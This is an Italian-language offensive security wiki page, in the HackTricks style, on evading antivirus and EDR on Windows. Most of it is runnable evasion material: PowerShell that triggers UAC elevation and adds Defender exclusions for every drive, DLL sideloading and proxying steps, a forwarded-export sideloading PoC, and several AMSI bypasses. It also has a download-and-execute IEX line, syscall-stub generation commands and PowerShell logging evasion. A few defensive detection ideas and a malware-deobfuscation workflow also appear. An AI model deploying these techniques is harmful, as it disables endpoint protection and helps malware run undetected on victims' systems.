# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare il funzionamento di Windows Defender mascherandosi da un altro AV.
- [Disabilita Defender se sei admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di gioco vengono frequentemente distribuiti come installer unsigned Node.js/Nexe che prima **chiedono all'utente l'elevazione** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verifica il contesto amministrativo con `net session`. Il comando ha successo solo quando il chiamante possiede i diritti admin, quindi un fallimento indica che il loader sta girando come utente standard.
2. Si rilancia immediatamente con il verbo `RunAs` per innescare il previsto prompt di consenso UAC mantenendo la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di installare “cracked” software, quindi la richiesta viene solitamente accettata, dando al malware i diritti necessari per modificare le impostazioni di Defender.

### Esclusioni generiche `MpPreference` per ogni lettera di unità

Once elevated, GachiLoader-style chains maximize Defender blind spots instead of disabling the service outright. The loader first kills the GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) and then pushes **esclusioni estremamente ampie** so every user profile, system directory, and removable disk becomes unscannable:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni chiave:

- Il loop scorre ogni filesystem montato (D:\, E:\, chiavette USB, ecc.) quindi **qualsiasi payload futuro lasciato da qualche parte sul disco viene ignorato**.
- L'esclusione per l'estensione `.sys` è lungimirante—gli attaccanti si riservano l'opzione di caricare driver non firmati in seguito senza toccare di nuovo Defender.
- Tutte le modifiche finiscono sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permettendo alle fasi successive di confermare che le esclusioni persistono o di espanderle senza riattivare UAC.

Poiché nessun servizio di Defender viene fermato, controlli di integrità ingenui continuano a riportare “antivirus attivo” anche se l'ispezione in tempo reale non tocca mai quei percorsi.

## **Metodologia di evasione AV**

Attualmente, gli AV usano diversi metodi per verificare se un file è malevolo o meno: static detection, dynamic analysis, e per gli EDR più avanzati, behavioural analysis.

### **Rilevamento statico**

Il rilevamento statico si ottiene segnalando stringhe note o array di byte maligni in un binario o script, ed estraendo anche informazioni dal file stesso (es. descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che usare tool pubblici noti può farti beccare più facilmente, poiché probabilmente sono già stati analizzati e segnalati come maligni. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se crittografi il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di qualche tipo di loader per decriptare ed eseguire il programma in memoria.

- **Obfuscation**

A volte basta cambiare alcune stringhe nel tuo binario o script per farlo passare oltre l'AV, ma questo può richiedere molto tempo a seconda di cosa stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi tool, non ci saranno firme note malevole, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per controllare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ognuno singolarmente; in questo modo può dirti esattamente quali stringhe o byte sono segnalati nel tuo binario.

Ti consiglio vivamente di guardare questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sulla pratica dell'AV Evasion.

### **Analisi dinamica**

L'analisi dinamica è quando l'AV esegue il tuo binario in una sandbox e osserva attività malevole (es. tentare di decriptare e leggere le password del browser, effettuare un minidump su LSASS, ecc.). Questa parte può essere un po' più difficile da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis degli AV. Gli AV hanno pochissimo tempo per scansionare i file per non interrompere il flusso dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse a disposizione (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Puoi anche essere molto creativo qui, ad esempio controllando la temperatura della CPU o perfino la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi prendere di mira un utente la cui workstation è joinata al dominio "contoso.local", puoi fare un controllo sul dominio del computer per vedere se corrisponde a quello che hai specificato; se non corrisponde, puoi far uscire il programma.

Risulta che il computername della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione: se il nome corrisponde a HAL9TH, significa che sei dentro la sandbox di Defender, quindi puoi far uscire il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per affrontare le Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come abbiamo detto prima in questo post, **public tools** alla fine **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno noto e che faccia comunque il dump di LSASS?

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei pezzi di malware più segnalati dagli AVs e dagli EDRs; pur essendo un progetto fighissimo, è anche un incubo lavorarci per aggirare gli AV, quindi cerca semplicemente alternative per ciò che vuoi ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disabilitare l'invio automatico dei sample** in Defender, e per favore, seriamente, **DO NOT UPLOAD TO VIRUSTOTAL** se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi controllare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando è possibile, dai sempre priorità all'uso di DLL per l'evasione: nella mia esperienza, i file DLL sono di solito **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di essere eseguito come DLL, ovviamente).

Come possiamo vedere in questa immagine, un DLL Payload da Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto antiscan.me di un normale payload Havoc EXE vs un normale payload Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima che il/i payload maligno/i affiancati l'uno all'altro.

Puoi cercare programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo seguente script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando mostrerà l'elenco dei programmi suscettibili a DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**, questa tecnica è abbastanza stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable noti pubblicamente potresti essere facilmente scoperto.

Il semplice posizionamento di una DLL malevola con il nome che un programma si aspetta di caricare non farà funzionare il tuo payload, perché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Lo considererei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abuso degli export inoltrati (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Carica `TargetDll` se non è già caricata
- Risolve `TargetFunc` da essa

Comportamenti chiave da comprendere:
- Se `TargetDll` è un KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (e.g., ntdll, kernelbase, ole32).
- Se `TargetDll` non è un KnownDLL, viene usato l'ordine normale di ricerca delle DLL, che include la directory del modulo che sta effettuando la risoluzione dell'forward.

Questo consente una primitive di sideloading indiretta: trova una signed DLL che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, poi colloca quella signed DLL nella stessa directory di una DLL controllata dall'attaccante chiamata esattamente come il modulo target inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo la tua DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
NCRYPTPROV.dll non è una KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copy-paste):
1) Copiare la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Drop a malicious `NCRYPTPROV.dll` nella stessa cartella. Un DllMain minimale è sufficiente per ottenere code execution; non è necessario implementare la forwarded function per trigger DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva l'inoltro con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward a `NCRYPTPROV.SetAuditingInterface`
- Il loader quindi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementato, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sui forwarded exports in cui il modulo di destinazione non è un KnownDLL. I KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee per rilevamento/difesa:
- Monitorare LOLBins (es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguite dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Segnalare catene processo/modulo come: `rundll32.exe` → non di sistema `keyiso.dll` → `NCRYPTPROV.dll` sotto percorsi scrivibili dall'utente
- Applicare politiche di integrità del codice (WDAC/AppLocker) e negare permessi di scrittura e esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion è solo un gioco del gatto e del topo; ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un unico strumento: se possibile, prova a concatenare più evasion techniques.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs spesso posizionano **user-mode inline hooks** su `ntdll.dll` syscall stubs. Per bypassare questi hook, puoi generare syscall stub **direct** o **indirect** che caricano il corretto **SSN** (System Service Number) e fanno la transizione in kernel mode senza eseguire l'export entrypoint hookato.

**Invocation options:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (nessun accesso all'export di `ntdll`).
- **Indirect**: salta dentro un gadget `syscall` esistente dentro `ntdll` in modo che la transizione al kernel appaia avere origine da `ntdll` (utile per heuristic evasion); **randomized indirect** sceglie un gadget da un pool per ogni chiamata.
- **Egg-hunt**: evita di incorporare la sequenza opcode statica `0F 05` su disco; risolve la sequenza syscall a runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: inferisce gli SSN ordinando gli syscall stub per virtual address invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa un `\KnownDlls\ntdll.dll` pulito, legge gli SSN dal suo `.text`, poi smappa (bypassa tutti gli hook in memoria).
- **RecycledGate**: combina l'inferenza SSN ordinata per VA con la validazione degli opcode quando uno stub è pulito; ritorna all'inferenza per VA se hooked.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per catturare l'SSN da `EAX` a runtime, senza parsare i hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado solo di scansionare **file on disk**, quindi se in qualche modo si riusciva a eseguire payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, poiché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permette alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma non crittografata e non unobfuscated.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso dell'eseguibile da cui lo script è stato eseguito, in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito tramite AMSI. Questo influisce anche su `Assembly.Load(byte[])` per l'esecuzione in-memory. Per questo motivo è consigliato usare versioni più basse di .NET (come 4.7.2 o inferiori) per l'esecuzione in-memory se si vuole eludere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI lavora principalmente con rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per evadere la rilevazione.

Tuttavia, AMSI ha la capacità di deoffuscare gli script anche se hanno più livelli di offuscamento, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene fatta. Questo la rende non così semplice da eludere. Anche se, a volte, tutto quello che serve è cambiare un paio di nomi di variabili e si è a posto, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato molteplici modi per evadere la scansione di AMSI.

**Forcing an Error**

Forzare l'inizializzazione di AMSI a fallire (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenire un utilizzo più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Questa riga è stata ovviamente segnalata dallo stesso AMSI, quindi è necessaria qualche modifica per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente questo verrà segnalato una volta pubblicato, quindi non dovresti pubblicare codice se il tuo piano è rimanere inosservato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile per la scansione dell'input fornito dall'utente) e sovrascriverla con istruzioni che ritornano il codice E_INVALIDARG; in questo modo il risultato della scansione effettiva sarà 0, interpretato come risultato pulito.

> [!TIP]
> Si prega di leggere [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocco di AMSI impedendo il caricamento di amsi.dll (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio è posizionare un user‑mode hook su `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non si effettuano scansioni per quel processo.

Schema di implementazione (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona su PowerShell, WScript/CScript e custom loaders allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Usalo insieme all'invio di script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti della riga di comando lunghi.
- Osservato l'uso da parte di loaders eseguiti tramite LOLBins (es., `regsvr32` che chiama `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Rimuovere la signature rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della signature AMSI e poi sovrascrivendola con NOP instructions, rimuovendola effettivamente dalla memoria.

**AV/EDR products that uses AMSI**

Puoi trovare una lista di AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi scripts senza essere scansionato da AMSI. Puoi fare questo:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di audit e risoluzione dei problemi, ma può anche essere un **problema per gli attaccanti che vogliono eludere il rilevamento**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: Se usi PowerShell version 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi farlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una powershell senza difese (questo è ciò che `powerpick` da Cobal Strike usa).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, il che aumenta l'entropia del binario rendendo più facile per AV ed EDR rilevarlo. Fai attenzione a questo aspetto e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o che devono essere nascoste.

### Deobfuscazione dei binari .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune trovarsi di fronte a diversi strati di protezione che bloccheranno i decompilatori e le sandbox. Il workflow seguente **ripristina in modo affidabile un IL quasi originale** che può successivamente essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Rimozione anti-tampering – ConfuserEx cifra ogni *method body* e lo decripta all'interno del costruttore statico del *module* (`<Module>.cctor`). Questo applica anche una patch al checksum PE, quindi qualsiasi modifica farà crashare il binario. Usa **AntiTamperKiller** per individuare le tabelle di metadata criptate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando si costruisce il proprio unpacker.

2.  Recupero di simboli / control-flow – fornisci il file *clean* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi di variabili originali e decritterà le stringhe costanti.

3.  Rimozione proxy-call – ConfuserEx sostituisce le chiamate di metodo dirette con wrapper leggeri (a.k.a *proxy calls*) per complicare ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il *vero* payload. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato all'interno di `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** la necessità di eseguire il sample malevolo – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per il triage automatico dei campioni.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite code obfuscation e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, a compile time, obfuscated code senza utilizzare strumenti esterni e senza modificare il compiler.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge uno strato di obfuscated operations generate dal C++ template metaprogramming framework che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un x64 binary obfuscator in grado di obfuscate diversi tipi di pe files inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice metamorphic code engine per arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un fine-grained code obfuscation framework per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator obfuscates un programma a livello di codice assembly trasformando istruzioni regolari in ROP chains, contrastando la nostra concezione naturale del normale controllo di flusso.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da internet ed eseguirli.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che applicazioni poco scaricate attiveranno SmartScreen avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al download dei file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo del Zone.Identifier ADS per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma trusted non attiveranno SmartScreen.

